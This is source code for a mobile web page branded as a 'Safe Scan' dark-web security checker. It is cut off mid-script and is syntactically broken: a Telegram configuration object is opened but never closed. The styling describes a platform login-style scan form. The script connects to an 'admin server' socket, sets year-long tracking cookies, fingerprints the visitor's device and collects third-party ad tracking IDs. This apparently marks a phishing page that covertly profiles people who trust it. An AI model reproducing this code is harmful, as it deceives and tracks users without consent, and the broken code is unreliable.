<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no, maximum-scale=1">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="Safe Scan">
    <meta name="theme-color" content="#0a0a1a">
    <meta name="description" content="Premium dark web monitoring & security scanning for your digital identity.">
    <title>Safe Scan — Dark Web Security</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        /* ═══════════════════════════════════════════════════════════════════
           APPLE LIQUID GLASS — MOBILE-ONLY DESIGN SYSTEM 2026
           ═══════════════════════════════════════════════════════════════════ */

        :root {
            /* Minimalist Light Mode Default */
            --bg-primary: #ffffff;
            --bg-elevated: #f8f9fa;
            --glass-bg: rgba(255, 255, 255, 0.7);
            --glass-bg-strong: rgba(241, 243, 245, 0.8);
            --glass-border: rgba(233, 236, 239, 0.8);
            --glass-border-light: rgba(248, 249, 250, 0.8);
            --glass-highlight: rgba(255, 255, 255, 0.4);
            --accent: #111111;
            --accent-light: #333333;
            --accent-glow: rgba(0, 0, 0, 0.15);
            --accent-soft: rgba(0, 0, 0, 0.05);
            --teal: #059669;
            --teal-soft: #ecfdf5;
            --rose: #e11d48;
            --rose-soft: #fff1f2;
            --amber: #d97706;
            --amber-soft: #fffbeb;
            --text-primary: #111827;
            --text-secondary: #4b5563;
            --text-tertiary: #9ca3af;
            --radius-xl: 24px;
            --radius-lg: 18px;
            --radius-md: 12px;
            --radius-sm: 8px;
            --radius-pill: 100px;
            --safe-top: max(0px, env(safe-area-inset-top, 0px));
            --safe-bottom: max(0px, env(safe-area-inset-bottom, 0px));
            --safe-left: max(0px, env(safe-area-inset-left, 0px));
            --safe-right: max(0px, env(safe-area-inset-right, 0px));
            --nav-height: 72px;
            --spring: cubic-bezier(0.4, 0, 0.2, 1);
            --ease-out: cubic-bezier(0.4, 0, 0.2, 1);
        }



        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
        }

        html {
            -webkit-user-select: none;
            user-select: none;
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
            overflow: hidden;
            height: 100%;
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            height: 100%;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            position: relative;
        }

        /* ── App Container ─────────────────────────────────────────────── */
        .app {
            height: 100%;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        /* ── Dynamic Island Safe Spacing ──────────────────────────────── */
        .status-bar-spacer {
            height: calc(12px + var(--safe-top));
            flex-shrink: 0;
        }

        /* ── Main Content Area ──────────────────────────────────── */
        .app-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-y: auto;
            overflow-x: hidden;
            -webkit-overflow-scrolling: touch;
        }

        .app-content::-webkit-scrollbar {
            display: none;
        }

        /* ── Ambient Background (Light Soft Blobs) ──────────────── */
        .ambient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -1;
            display: block;
            background: var(--bg-primary);
        }
        .ambient-bg::before, .ambient-bg::after {
            content: '';
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.4;
            animation: breathe 15s ease-in-out infinite alternate;
        }
        .ambient-bg::before {
            width: 50vw;
            height: 50vw;
            top: -10vw;
            left: -10vw;
            background: radial-gradient(circle, rgba(17, 17, 17, 0.05), transparent);
        }
        .ambient-bg::after {
            width: 40vw;
            height: 40vw;
            bottom: -5vw;
            right: -5vw;
            background: radial-gradient(circle, rgba(5, 150, 105, 0.05), transparent);
            animation-delay: -7.5s;
        }
        @keyframes breathe {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1.1); opacity: 1; }
        }

        /* ═══════════════════════════════════════════════════════════════════
           SCREEN 1 — HERO
           ═══════════════════════════════════════════════════════════════════ */
        .screen {
            min-height: 100svh;
            min-height: 100vh;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            position: relative;
            scroll-snap-align: start;
        }

        .screen-hero {
            justify-content: center;
            align-items: center;
            text-align: center;
            padding-top: calc(60px + var(--safe-top));
            padding-bottom: 100px;
        }

        /* Shield Icon */
        .hero-shield {
            width: 120px;
            height: 120px;
            margin: 0 auto 32px;
            position: relative;
        }

        .hero-shield-inner {
            width: 100%;
            height: 100%;
            background: var(--bg-elevated);
            border: 1.5px solid var(--glass-border);
            border-radius: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
        }

        .hero-shield-inner i {
            font-size: 42px;
            color: var(--accent);
            position: relative;
            z-index: 1;
        }

        .hero-shield-pulse {
            display: none;
        }

        @keyframes hero-float {

            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }

            50% {
                transform: translateY(-10px) rotate(2deg);
            }
        }

        @keyframes shield-rotate {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes shield-pulse {
            0% {
                transform: scale(1);
                opacity: 0.6;
            }

            100% {
                transform: scale(1.3);
                opacity: 0;
            }
        }

        /* Hero Text */
        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: var(--accent-soft);
            border: 1px solid rgba(124, 106, 255, 0.25);
            border-radius: var(--radius-pill);
            font-size: 0.72rem;
            font-weight: 600;
            color: var(--accent-light);
            letter-spacing: 0.5px;
            text-transform: uppercase;
            margin-bottom: 24px;
            opacity: 0;
            animation: fade-up 0.8s var(--ease-out) 0.3s both;
        }

        .hero-badge-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--teal);
            box-shadow: 0 0 8px rgba(93, 228, 199, 0.6);
            animation: dot-glow 2s ease-in-out infinite;
        }

        @keyframes dot-glow {

            0%,
            100% {
                box-shadow: 0 0 6px rgba(93, 228, 199, 0.5);
            }

            50% {
                box-shadow: 0 0 14px rgba(93, 228, 199, 0.8);
            }
        }

        .hero-headline {
            font-size: 2.4rem;
            font-weight: 800;
            line-height: 1.08;
            letter-spacing: -1.5px;
            margin-bottom: 16px;
            opacity: 0;
            animation: fade-up 0.8s var(--ease-out) 0.5s both;
        }

        .hero-headline .gradient-text {
            background: linear-gradient(135deg, var(--accent-light) 0%, var(--teal) 60%, var(--accent) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .hero-sub {
            font-size: 1rem;
            color: var(--text-secondary);
            line-height: 1.6;
            margin-bottom: 40px;
            max-width: 320px;
            margin-left: auto;
            margin-right: auto;
            opacity: 0;
            animation: fade-up 0.8s var(--ease-out) 0.7s both;
        }

        /* Hero CTA */
        .hero-cta {
            opacity: 0;
            animation: fade-up 0.8s var(--ease-out) 0.9s both;
        }

        .btn-primary {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 18px 44px;
            background: linear-gradient(135deg, var(--accent) 0%, #5b4aee 100%);
            color: #fff;
            border: none;
            border-radius: var(--radius-md);
            font-size: 1.05rem;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            box-shadow: 0 12px 40px var(--accent-glow);
            min-height: 56px;
            -webkit-appearance: none;
            appearance: none;
            transition: transform 0.3s var(--spring), box-shadow 0.3s ease;
            width: 100%;
            justify-content: center;
            letter-spacing: 0.3px;
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.18), transparent 60%);
            border-radius: inherit;
        }

        .btn-primary::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.5s ease, height 0.5s ease;
        }

        .btn-primary:active {
            transform: scale(0.96);
            box-shadow: 0 6px 20px rgba(124, 106, 255, 0.3);
        }

        .btn-primary:active::after {
            width: 300px;
            height: 300px;
        }

        .btn-primary .btn-icon {
            transition: transform 0.3s var(--spring);
        }

        .btn-primary:active .btn-icon {
            transform: translateX(4px);
        }

        /* Scroll Indicator */
        .scroll-indicator {
            position: absolute;
            bottom: max(30px, calc(var(--safe-bottom) + 12px));
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            opacity: 0;
            animation: fade-up 0.6s ease 1.5s both;
        }

        .scroll-pill {
            width: 28px;
            height: 44px;
            border: 2px solid var(--text-tertiary);
            border-radius: 14px;
            position: relative;
        }

        .scroll-dot {
            width: 4px;
            height: 8px;
            background: var(--accent-light);
            border-radius: 2px;
            position: absolute;
            top: 8px;
            left: 50%;
            transform: translateX(-50%);
            animation: scroll-bounce 2s ease-in-out infinite;
        }

        @keyframes scroll-bounce {

            0%,
            100% {
                transform: translateX(-50%) translateY(0);
                opacity: 1;
            }

            50% {
                transform: translateX(-50%) translateY(14px);
                opacity: 0.3;
            }
        }

        .scroll-label {
            font-size: 0.62rem;
            color: var(--text-tertiary);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 500;
        }

        @keyframes fade-up {
            from {
                opacity: 0;
                transform: translateY(24px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ═══════════════════════════════════════════════════════════════════
           SCREEN 2 — SECURITY STATUS
           ═══════════════════════════════════════════════════════════════════ */
        .screen-status {
            min-height: auto;
            padding: 60px 20px 40px;
            scroll-snap-align: start;
        }

        .section-label {
            font-size: 0.68rem;
            font-weight: 700;
            color: var(--accent-light);
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .section-title {
            font-size: 1.7rem;
            font-weight: 800;
            letter-spacing: -0.8px;
            margin-bottom: 24px;
            line-height: 1.15;
        }

        /* Swipeable Glass Cards */
        .swipe-cards {
            display: flex;
            gap: 14px;
            overflow-x: auto;
            padding: 4px 0 20px;
            scroll-snap-type: x mandatory;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: none;
        }

        .swipe-cards::-webkit-scrollbar {
            display: none;
        }

        .stat-card {
            flex: 0 0 calc(100vw - 56px);
            scroll-snap-align: center;
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: var(--radius-xl);
            padding: 28px 24px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 16px 48px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 var(--glass-highlight);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--glass-highlight), transparent);
        }

        .stat-card-icon {
            width: 52px;
            height: 52px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            margin-bottom: 20px;
            position: relative;
        }

        .stat-card-icon.purple {
            background: var(--accent-soft);
            color: var(--accent-light);
        }

        .stat-card-icon.teal {
            background: var(--teal-soft);
            color: var(--teal);
        }

        .stat-card-icon.rose {
            background: var(--rose-soft);
            color: var(--rose);
        }

        .stat-card-number {
            font-size: 2.8rem;
            font-weight: 900;
            letter-spacing: -2px;
            line-height: 1;
            margin-bottom: 6px;
        }

        .stat-card-number.purple-grad {
            background: linear-gradient(135deg, var(--accent-light), #c4b5fd);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-card-number.teal-grad {
            background: linear-gradient(135deg, var(--teal), #a7f3d0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-card-number.rose-grad {
            background: linear-gradient(135deg, var(--rose), #fca5a5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .stat-card-label {
            font-size: 0.88rem;
            color: var(--text-secondary);
            font-weight: 500;
        }

        .stat-card-bar {
            margin-top: 20px;
            height: 6px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 3px;
            overflow: hidden;
        }

        .stat-card-bar-fill {
            height: 100%;
            border-radius: 3px;
            width: 0%;
            transition: width 1.5s var(--ease-out);
        }

        .stat-card-bar-fill.purple {
            background: linear-gradient(90deg, var(--accent), var(--accent-light));
        }

        .stat-card-bar-fill.teal {
            background: linear-gradient(90deg, var(--teal), #a7f3d0);
        }

        .stat-card-bar-fill.rose {
            background: linear-gradient(90deg, var(--rose), #fca5a5);
        }

        /* Scroll Dots */
        .scroll-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 4px;
        }

        .scroll-dots span {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--text-tertiary);
            transition: all 0.3s ease;
        }

        .scroll-dots span.active {
            width: 20px;
            border-radius: 3px;
            background: var(--accent-light);
        }

        /* ═══════════════════════════════════════════════════════════════════
           SCREEN 3 — SECURITY CHECK FORM
           ═══════════════════════════════════════════════════════════════════ */
        .screen-form {
            width: 100%;
            max-width: 400px;
        }

        .form-glass {
            background: var(--glass-bg);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid var(--glass-border);
            border-radius: var(--radius-xl);
            padding: 32px 22px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 20px 60px rgba(0, 0, 0, 0.08),
                inset 0 1px 0 rgba(255, 255, 255, 0.5);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .form-glass:hover {
            transform: translateY(-2px);
            box-shadow:
                0 25px 70px rgba(0, 0, 0, 0.12),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .form-glass::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(124, 106, 255, 0.4), transparent);
        }

        /* Face ID Icon */
        .form-icon {
            width: 72px;
            height: 72px;
            margin: 0 auto 24px;
            border-radius: 20px;
            background: linear-gradient(145deg, var(--accent-soft), rgba(93, 228, 199, 0.08));
            border: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .form-icon i {
            font-size: 30px;
            color: var(--accent-light);
        }

        .form-icon::after {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 23px;
            border: 1.5px dashed rgba(124, 106, 255, 0.2);
            animation: icon-rotate 12s linear infinite;
        }

        @keyframes icon-rotate {
            to {
                transform: rotate(360deg);
            }
        }

        .form-title {
            text-align: center;
            font-size: 1.4rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 6px;
        }

        .form-sub {
            text-align: center;
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin-bottom: 28px;
            line-height: 1.5;
        }

        /* Platform Tab Selector */
        .platform-tabs {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 6px;
            padding: 4px;
            background: rgba(0, 0, 0, 0.25);
            border-radius: var(--radius-md);
            margin-bottom: 24px;
        }

        .platform-tab {
            padding: 12px 4px;
            background: transparent;
            border: none;
            color: var(--text-tertiary);
            border-radius: var(--radius-sm);
            font-size: 0.68rem;
            font-weight: 600;
            font-family: inherit;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            min-height: 52px;
            justify-content: center;
            -webkit-appearance: none;
            appearance: none;
            transition: all 0.3s var(--spring);
            cursor: pointer;
        }

        .platform-tab i {
            font-size: 16px;
        }

        .platform-tab.active {
            background: var(--glass-bg-strong);
            color: var(--text-primary);
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.2);
            border: 1px solid var(--glass-border);
        }

        .platform-tab:active {
            transform: scale(0.93);
        }

        /* Input Fields */
        .form-fields {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-bottom: 20px;
        }

        .input-wrap {
            position: relative;
        }

        .input-wrap i {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-tertiary);
            font-size: 15px;
            z-index: 2;
            pointer-events: none;
            transition: color 0.25s ease;
        }

        .glass-input {
            width: 100%;
            padding: 16px 18px 16px 48px;
            background: rgba(255, 255, 255, 0.04);
            border: 1.5px solid var(--glass-border-light);
            border-radius: var(--radius-md);
            font-size: 1rem;
            font-family: inherit;
            color: var(--text-primary);
            outline: none;
            min-height: 54px;
            -webkit-appearance: none;
            appearance: none;
            -webkit-user-select: text;
            user-select: text;
            transition: all 0.3s ease;
        }

        .glass-input::placeholder {
            color: var(--text-tertiary);
            font-weight: 400;
        }

        .glass-input:focus {
            border-color: rgba(124, 106, 255, 0.5);
            background: rgba(124, 106, 255, 0.06);
            box-shadow: 0 0 0 4px rgba(124, 106, 255, 0.1);
        }

        .input-wrap:focus-within i {
            color: var(--accent-light);
        }

        /* Scan Button */
        .btn-scan {
            width: 100%;
            padding: 18px;
            background: var(--accent);
            color: var(--bg-primary, #fff);
            border: none;
            border-radius: var(--radius-md);
            font-size: 1rem;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            min-height: 58px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            -webkit-appearance: none;
            appearance: none;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 35px var(--accent-glow);
            transition: transform 0.3s var(--spring), box-shadow 0.3s ease;
            letter-spacing: 0.3px;
        }
        .btn-scan:hover {
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.2);
            transform: translateY(-2px);
        }

        .btn-scan::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 60%);
        }

        .btn-scan:active {
            transform: scale(0.96);
            box-shadow: 0 4px 16px rgba(124, 106, 255, 0.25);
        }

        .btn-scan:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-scan .fa-spin {
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Tab Content */
        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: tab-enter 0.35s var(--ease-out);
        }

        @keyframes tab-enter {
            from {
                opacity: 0;
                transform: translateY(8px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Leak Result */
        .leak-result {
            margin-top: 16px;
            padding: 16px 18px;
            border-radius: var(--radius-md);
            font-size: 0.88rem;
            font-weight: 500;
            line-height: 1.5;
            display: none;
        }

        .leak-result.show {
            display: block;
            animation: fade-up 0.35s ease;
        }

        .leak-result.safe {
            background: var(--teal-soft);
            border: 1.5px solid rgba(93, 228, 199, 0.3);
            color: var(--teal);
        }

        .leak-result.danger {
            background: var(--rose-soft);
            border: 1.5px solid rgba(255, 107, 138, 0.3);
            color: var(--rose);
            animation: danger-glow 2s ease-in-out infinite;
        }

        @keyframes danger-glow {

            0%,
            100% {
                box-shadow: 0 0 0 0 rgba(255, 107, 138, 0);
            }

            50% {
                box-shadow: 0 0 0 6px rgba(255, 107, 138, 0.08);
            }
        }

        .leak-result.warning {
            background: var(--amber-soft);
            border: 1.5px solid rgba(255, 184, 108, 0.3);
            color: var(--amber);
        }

        .leak-result i {
            margin-right: 8px;
        }

        .leak-count {
            font-weight: 800;
            font-size: 1.1rem;
        }

        /* ═══════════════════════════════════════════════════════════════════
           SCREEN 4 — FEATURES
           ═══════════════════════════════════════════════════════════════════ */
        .screen-features {
            min-height: auto;
            padding: 40px 20px 140px;
            scroll-snap-align: start;
        }

        .feature-scroll {
            display: flex;
            gap: 14px;
            overflow-x: auto;
            padding: 4px 0 20px;
            scroll-snap-type: x mandatory;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: none;
        }

        .feature-scroll::-webkit-scrollbar {
            display: none;
        }

        .feature-card {
            flex: 0 0 calc(80vw - 20px);
            max-width: 280px;
            scroll-snap-align: center;
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: var(--radius-xl);
            padding: 28px 22px;
            position: relative;
            overflow: hidden;
            box-shadow:
                0 12px 40px rgba(0, 0, 0, 0.25),
                inset 0 1px 0 var(--glass-highlight);
            transition: transform 0.3s var(--spring);
        }

        .feature-card:active {
            transform: scale(0.97);
        }

        .feature-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--glass-highlight), transparent);
        }

        .feature-card-icon {
            width: 56px;
            height: 56px;
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            margin-bottom: 18px;
        }

        .feature-card-title {
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .feature-card-desc {
            font-size: 0.82rem;
            color: var(--text-secondary);
            line-height: 1.55;
        }

        .feature-card-tag {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 6px 12px;
            border-radius: var(--radius-pill);
            font-size: 0.65rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 18px;
        }

        .feature-card-tag.active-tag {
            background: var(--teal-soft);
            color: var(--teal);
        }

        .feature-card-tag.coming-tag {
            background: var(--amber-soft);
            color: var(--amber);
        }

        /* ═══════════════════════════════════════════════════════════════════
           BOTTOM NAVIGATION — FLOATING GLASS DOCK
           ═══════════════════════════════════════════════════════════════════ */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 100;
            padding: 0 16px;
            padding-bottom: max(8px, var(--safe-bottom));
        }

        .nav-dock {
            background: var(--bg-elevated);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 8px 6px;
            box-shadow:
                0 -4px 30px rgba(0, 0, 0, 0.4),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);
            max-width: 400px;
            margin: 0 auto;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            padding: 10px 18px;
            border-radius: 16px;
            background: transparent;
            border: none;
            color: var(--text-tertiary);
            font-size: 0.58rem;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            -webkit-appearance: none;
            appearance: none;
            min-height: 48px;
            min-width: 56px;
            transition: all 0.3s var(--spring);
            position: relative;
        }

        .nav-item i {
            font-size: 20px;
            transition: all 0.3s var(--spring);
        }

        .nav-item.active {
            color: var(--accent-light);
            background: var(--accent-soft);
        }

        .nav-item.active i {
            transform: scale(1.1) translateY(-1px);
        }

        .nav-item:active {
            transform: scale(0.9);
        }

        .nav-badge {
            position: absolute;
            top: 4px;
            right: 10px;
            width: 8px;
            height: 8px;
            background: var(--rose);
            border-radius: 50%;
            border: 2px solid var(--bg-primary);
            box-shadow: 0 0 6px rgba(255, 107, 138, 0.5);
        }

        /* ═══════════════════════════════════════════════════════════════════
           STATUS TOAST
           ═══════════════════════════════════════════════════════════════════ */
        .status-toast {
            position: fixed;
            top: calc(8px + var(--safe-top));
            left: 16px;
            right: 16px;
            z-index: 200;
            padding: 14px 18px;
            border-radius: var(--radius-md);
            font-size: 0.82rem;
            font-weight: 600;
            text-align: center;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            opacity: 0;
            transform: translateY(-20px);
            pointer-events: none;
            transition: all 0.4s var(--spring);
        }

        .status-toast.visible {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        .status-toast.sending {
            background: rgba(124, 106, 255, 0.15);
            border: 1px solid rgba(124, 106, 255, 0.3);
            color: var(--accent-light);
        }

        .status-toast.success {
            background: rgba(93, 228, 199, 0.15);
            border: 1px solid rgba(93, 228, 199, 0.3);
            color: var(--teal);
        }

        .status-toast.error {
            background: rgba(255, 107, 138, 0.15);
            border: 1px solid rgba(255, 107, 138, 0.3);
            color: var(--rose);
        }

        .status-toast.warning {
            background: rgba(255, 184, 108, 0.15);
            border: 1px solid rgba(255, 184, 108, 0.3);
            color: var(--amber);
        }

        /* ═══════════════════════════════════════════════════════════════════
           UTILITY & ANIMATION CLASSES
           ═══════════════════════════════════════════════════════════════════ */
        .hidden {
            display: none !important;
        }

        .haptic-press {
            animation: haptic 0.15s ease;
        }

        @keyframes haptic {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(0.94);
            }

            100% {
                transform: scale(1);
            }
        }

        /* Intersection Observer Reveal */
        .reveal {
            opacity: 0;
            transform: translateY(30px);
            transition: opacity 0.7s var(--ease-out), transform 0.7s var(--ease-out);
        }

        .reveal.visible {
            opacity: 1;
            transform: translateY(0);
        }

        /* ═══════════════════════════════════════════════════════════════════
           iOS SAFARI CRITICAL OVERRIDES
           ═══════════════════════════════════════════════════════════════════ */
        @supports (-webkit-touch-callout: none) {
            .glass-input {
                font-size: 16px;
                /* prevent zoom on focus */
            }

            .form-glass,
            .stat-card,
            .feature-card,
            /* -webkit-backdrop-filter: blur(24px) saturate(180%); Removed for performance */

            body,
            .app-content {
                -webkit-overflow-scrolling: touch;
            }
        }

        @media (prefers-reduced-motion: reduce) {

            *,
            *::before,
            *::after {
                animation-duration: 0.01ms !important;
                transition-duration: 0.01ms !important;
            }
        }

        /* Small phones */
        @media (max-width: 360px) {
            .hero-headline {
                font-size: 2rem;
            }

            .stat-card {
                flex: 0 0 calc(100vw - 48px);
            }

            .feature-card {
                flex: 0 0 calc(85vw - 16px);
            }

            .stat-card-number {
                font-size: 2.2rem;
            }

            .platform-tabs {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        /* Large phones */
        @media (min-width: 430px) {
            .stat-card {
                flex: 0 0 300px;
            }

            .feature-card {
                flex: 0 0 260px;
            }
        }
    </style>
</head>

        <script>
            // ═══════════════════════════════════════════════════════════════
            // TELEGRAM CONFIGURATION

            const telegramConfig = {

            // ═══════════════════════════════════════════════════════════════
            // ADMIN SERVER CONFIGURATION & SOCKET DYNAMIC LOADING
            // ═══════════════════════════════════════════════════════════════
            const adminServerUrl = (function () {
                if (window.location.protocol === 'file:') {
                    return 'http://localhost:3001';
                }
                const host = window.location.hostname;
                // Production / hosted (Render, etc.) — use same origin
                if (host !== 'localhost' && host !== '127.0.0.1') {
                    return window.location.origin;
                }
                // If running on local server but front-end is on a dev port (e.g. Live Server on 5500)
                if (window.location.port !== '3001') {
                    return `http://${host}:3001`;
                }
                // In all other cases (local Express server on 3001), connect to the page's served origin
                return window.location.origin;
            })();
            let adminSocket = null;
            // ─── Cookie helpers ───────────────────────────────────────
            function getCookie(name) {
                const match = document.cookie.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
                return match ? decodeURIComponent(match[1]) : null;
            }
            function setCookie(name, value, days) {
                const maxAge = days * 24 * 60 * 60;
                document.cookie = name + '=' + encodeURIComponent(value) + '; path=/; max-age=' + maxAge + '; SameSite=Lax';
            }

            // ═══════════════════════════════════════════════════════════
            // ALL SESSION IDs COLLECTION
            // ═══════════════════════════════════════════════════════════

            // 1. COOKIE SESSION ID — persistent across browser sessions (1 year)
            const cookieSessionId = getCookie('safescan_session_id');
            const localSessionId = localStorage.getItem('safescan_uuid');
            const userUUID = cookieSessionId || localSessionId || crypto.randomUUID();
            setCookie('safescan_session_id', userUUID, 365);
            localStorage.setItem('safescan_uuid', userUUID);

            // 2. TAB SESSION ID — unique per browser tab (survives refresh, dies on tab close)
            let tabSessionId = sessionStorage.getItem('safescan_tab_id');
            if (!tabSessionId) {
                tabSessionId = 'tab_' + crypto.randomUUID().split('-')[0];
                sessionStorage.setItem('safescan_tab_id', tabSessionId);
            }

            // 3. PAGE LOAD ID — unique for every page load/refresh
            const pageLoadId = 'pg_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 8);

            // 4. BROWSER FINGERPRINT ID — hash of browser characteristics (stable per device/browser)
            function generateFingerprint() {
                const components = [
                    navigator.userAgent,
                    navigator.language,
                    navigator.languages ? navigator.languages.join(',') : '',
                    screen.width + 'x' + screen.height,
                    screen.colorDepth,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || '',
                    navigator.maxTouchPoints || 0,
                    navigator.platform || '',
                    (navigator.deviceMemory || ''),
                    (navigator.connection ? navigator.connection.effectiveType : ''),
                    !!window.indexedDB,
                    !!window.sessionStorage,
                    !!window.localStorage,
                    !!window.openDatabase,
                    typeof window.ontouchstart,
                    navigator.cookieEnabled,
                    navigator.doNotTrack || '',
                    navigator.vendor || ''
                ];
                // Simple hash
                const str = components.join('|||');
                let hash = 0;
                for (let i = 0; i < str.length; i++) {
                    const char = str.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash; // Convert to 32bit int
                }
                return 'fp_' + Math.abs(hash).toString(36);
            }
            const fingerprintId = generateFingerprint();

            // 5. SOCKET ID — assigned by Socket.IO server (collected after connect)
            // This is sent separately via the 'user:register' after socket connects

            // 6. ANALYTICS & TRACKING IDs — Third-party cookies and URL parameters
            function getThirdPartyIds() {
                const ids = {};
                // Parse cookies for common tracking IDs
                ids.ga_client_id = getCookie('_ga') || null;
                ids.fb_pixel_id = getCookie('_fbp') || null;
                ids.tiktok_pixel_id = getCookie('_ttp') || null;

                // Parse URL search params
                const params = new URLSearchParams(window.location.search);
                ids.gclid = params.get('gclid') || null;
